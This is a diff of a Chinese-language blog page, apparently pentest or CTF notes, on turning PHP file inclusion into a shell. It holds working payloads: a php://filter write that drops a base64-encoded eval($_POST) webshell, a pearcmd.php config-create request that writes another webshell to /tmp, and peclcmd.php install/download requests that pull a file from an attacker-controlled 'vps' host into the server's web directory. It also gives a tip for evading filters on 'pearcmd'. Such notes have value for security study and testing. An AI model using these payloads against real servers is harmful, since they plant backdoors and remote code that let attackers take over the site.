@@ -303,7 +303,9 @@
 </ol>
 <p>也可以先使用strip_tags去除 HTML 和 PHP 标记<br><code>?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p>
 <h3 id="直接包含getshell"><a href="#直接包含getshell" class="headerlink" title="直接包含getshell"></a>直接包含getshell</h3><p>膜拜<code>https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</code></p>
-
+<p>要利用这个pearcmd.php需要满足几个条件</p>
+<p>安装pecl/pear(php7.3之前默认安装,docker默认安装)<br>要开启register_argc_argv这个选项（在Docker中自动开启）<br>要有文件包含的利用点<br>确定pearcmd.php的位置，通常为/usr/local/lib/php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt;+/tmp/test.php </span><br><span class="line"></span><br><span class="line">/?file=/www/server/php/52/lib/php/peclcmd.php&amp;+install+http://vps/1.php</span><br><span class="line">#文件就会被下载到/tmp/pear/download/1.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#这个直接下载到web目录了，不用提前知道web目录具体路径</span><br><span class="line">/?file=/www/server/php/52/lib/php/peclcmd.php&amp;+download+http://vps/1.php</span><br><span class="line"></span><br><span class="line">#如果pearcmd关键词被ban怎么半，其实可以用peclcmd.php作为平替</span><br></pre></td></tr></table></figure>
         </div>
 
         
